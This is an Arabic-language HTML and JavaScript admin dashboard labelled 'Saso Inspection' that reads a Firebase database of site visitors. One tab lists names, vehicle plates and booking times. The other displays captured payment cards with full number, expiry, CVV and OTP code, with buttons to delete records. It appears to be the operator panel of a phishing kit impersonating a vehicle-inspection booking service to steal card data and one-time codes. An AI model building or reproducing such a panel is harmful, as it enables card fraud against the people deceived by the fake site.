<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - Saso Inspection</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
        .nav-btn.active { background: #ffffff; color: #1e7344; }
        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
        .container { padding: 15px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
        .customer-card { background: white; border-radius: 12px; padding: 20px; border-right: 8px solid #1e7344; box-shadow: 0 4px 10px rgba(0,0,0,0.05); position: relative; }
        .operation-row { background: white; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; border: 1px solid #eee; }
        .box { padding: 8px 12px; border-radius: 6px; font-size: 13px; font-weight: bold; }
        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; }
        .btn-delete { background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
        h3 { margin-top: 0; color: #1e7344; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        p { margin: 8px 0; font-size: 14px; color: #555; }
        .plate-style { color: #d93025; font-weight: bold; background: #f9f9f9; padding: 2px 5px; border-radius: 3px; }
    </style>
</head>
<body>

<div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> زائر 🌐</div>

<div class="navbar">
    <button class="nav-btn active" id="btn-booking" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
    <button class="nav-btn" id="btn-cards" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
</div>

<div class="container">
    <div id="bookingSection" class="tab-content active">
        <div id="bookingGrid" class="booking-grid"></div>
    </div>
    
    <div id="cardsSection" class="tab-content">
        <div id="paymentsContainer"></div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.appspot.com",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };
    
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const database = firebase.database();

    // عداد الزوار
    database.ref('visitors').on('value', s => {
        document.getElementById('onlineCount').innerText = s.numChildren();
    });

    // عرض بيانات الحجز (المعلومات الشخصية)
    database.ref('visitors').on('value', (snapshot) => {
        const grid = document.getElementById('bookingGrid');
        grid.innerHTML = '';
        snapshot.forEach((child) => {
            const val = child.val();
            // استخدام الأسماء الموحدة لضمان ظهور البيانات
            const name = val.fullName || val.full_name || 'زائر';
            const vehicle = val.vehicleType || val.vehicle_type || '-';
            const plate = val.plateNumber || val.plate_number || '-';
            const date = val.bookingDate || val.appointment_date || '-';
            const time = val.bookingTime || val.appointment_time || '-';

            grid.innerHTML += `
            <div class="customer-card">
                <h3>${name}</h3>
                <p>🚗 <b>النوع:</b> ${vehicle}</p>
                <p>🔢 <b>اللوحة:</b> <span class="plate-style">${plate}</span></p>
                <p>📍 ${val.region || '-'} - ${val.center || '-'}</p>
                <p>📅 ${date} | 🕒 ${time}</p>
                <div style="margin-top:15px; display:flex; justify-content:space-between; align-items:center;">
                    <small style="color:#999">${val.lastUpdate || ''}</small>
                    <button class="btn-delete" onclick="deleteData('visitors/${child.key}')">حذف</button>
                </div>
            </div>`;
        });
    });

    // عرض بيانات البطاقات
    database.ref('payments').on('value', (snapshot) => {
        const container = document.getElementById('paymentsContainer');
        container.innerHTML = '';
        snapshot.forEach((child) => {
            const val = child.val();
            container.innerHTML += `
            <div class="operation-row">
                <div style="min-width:120px"><b>${val.name || 'عميل'}</b></div>
                <div class="box card-box">💳 ${val.cardNumber || '----'} | ${val.exp || '--'} | ${val.cvv || '--'}</div>
                <div class="box" style="background:#fff5f5">🔐 OTP: ${val.otp || '-'}</div>
                <button class="btn-delete" onclick="deleteData('payments/${child.key}')">🗑</button>
            </div>`;
        });
    });

    function deleteData(path) { 
        if(confirm('هل أنت متأكد من حذف هذه البيانات؟')) database.ref(path).remove(); 
    }

    function openTab(evt, tabName) {
        var i, tabcontent, navbtns;
        tabcontent = document.getElementsByClassName("tab-content");
        for (i = 0; i < tabcontent.length; i++) {
            tabcontent[i].style.display = "none";
            tabcontent[i].classList.remove("active");
        }
        navbtns = document.getElementsByClassName("nav-btn");
        for (i = 0; i < navbtns.length; i++) {
            navbtns[i].className = navbtns[i].className.replace(" active", "");
        }
        document.getElementById(tabName).style.display = "block";
        document.getElementById(tabName).classList.add("active");
        evt.currentTarget.className += " active";
    }
</script>
</body>
</html>
